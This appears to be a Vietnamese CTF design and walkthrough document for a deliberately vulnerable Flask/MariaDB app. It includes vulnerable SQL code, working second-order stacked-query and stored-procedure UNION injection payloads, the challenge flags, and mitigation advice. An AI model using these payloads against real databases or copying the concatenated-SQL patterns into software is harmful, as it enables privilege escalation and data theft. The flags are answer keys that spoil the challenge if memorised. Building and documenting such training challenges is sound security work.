# Technical Specification & Walkthrough — IVRS

> Tài liệu kỹ thuật chi tiết dành cho Giám khảo, Ban Đề và Kỹ sư SOC Tier 3.

---

## 1. Kiến Trúc Hệ Thống (Architecture)

```
[Attacker / Player]
       │
       ▼ (HTTP Port 5001 -> Container 5000)
┌──────────────────────────────────────────────┐
│ Flask Web Application (Python 3.12)          │
│ - PyMySQL with CLIENT.MULTI_STATEMENTS       │
│ - Parameterized Insert at /register          │
│ - String Concatenation SQL at /export        │
│ - Procedure Call with raw input at /dashboard│
└──────────────────────┬───────────────────────┘
                       │ (MySQL Protocol Port 3306)
                       ▼
┌──────────────────────────────────────────────┐
│ MariaDB 10.11 Engine                         │
│ - Table: users (id, username, role, ...)     │
│ - Table: reports (id, user_id, title, ...)   │
│ - Table: admin_secrets (id, flag)            │
│ - Procedure: GetTopReporter(sortCol)         │
└──────────────────────────────────────────────┘
```

---

## 2. Thiết Kế Các Điểm Lỗ Hổng (Vulnerability Breakdown)

### Act 1: Second-Order Stacked Query SQL Injection
- **Root Cause:** Lỗi tin cậy dữ liệu đã lưu trong cơ sở dữ liệu. Tại route `register`, ứng dụng dùng query an toàn, khiến kẻ tấn công lưu được payload vào cột `username`. Khi người dùng thực hiện tính năng `export`, hệ thống lấy lại `username` và nối chuỗi trực tiếp:
  ```python
  query = f"UPDATE users SET last_export = NOW() WHERE username = '{username}'"
  ```
- **Prerequisite:** Driver PyMySQL được khởi tạo với cờ `client_flag=CLIENT.MULTI_STATEMENTS`.
- **Payload:**
  ```sql
  anything';UPDATE users SET role='reviewer';#
  ```
- **Flag 1:** Sau khi role chuyển thành `reviewer`, trang `reports` trả về:
  `FLAG{s3c0nd_0rd3r_st4ck3d_qu3ry_pwn3d}`

### Act 2: Dynamic SQL Injection in Stored Procedure
- **Root Cause:** Thủ tục lưu trữ `GetTopReporter` nhận biến đầu vào `sortCol` và ghép trực tiếp vào câu lệnh SQL chuẩn bị (`PREPARE stmt FROM @query`).
- **Procedure Implementation:**
  ```sql
  CREATE PROCEDURE GetTopReporter(IN sortCol VARCHAR(128))
  BEGIN
    SET @query = CONCAT(
      'SELECT user_id, COUNT(*) as cnt FROM reports GROUP BY user_id ORDER BY ',
      sortCol,
      ' DESC LIMIT 5'
    );
    PREPARE stmt FROM @query;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
  END
  ```
- **Payload:**
  ```sql
  cnt UNION SELECT flag, 1 FROM admin_secrets -- 
  ```
- **Flag 2:** `FLAG{st0r3d_pr0c3dur3_1nj3ct10n_m4st3r}`

---

## 3. Tiêu Chuẩn Phòng Thủ (Mitigation & Hardening)

1. **Khắc phục Act 1:**
   - Tuyệt đối không nối chuỗi trong câu lệnh SQL dù dữ liệu lấy từ DB hay Session:
     ```python
     cur.execute("UPDATE users SET last_export = NOW() WHERE username = %s", (username,))
     ```
   - Tắt cờ `MULTI_STATEMENTS` nếu ứng dụng không thực sự bắt buộc cần đến.

2. **Khắc phục Act 2:**
   - Trong Stored Procedure, áp dụng Whitelist đối với các cột được phép `ORDER BY`:
     ```sql
     IF sortCol NOT IN ('cnt', 'user_id', 'created_at') THEN
       SET sortCol = 'cnt';
     END IF;
     ```
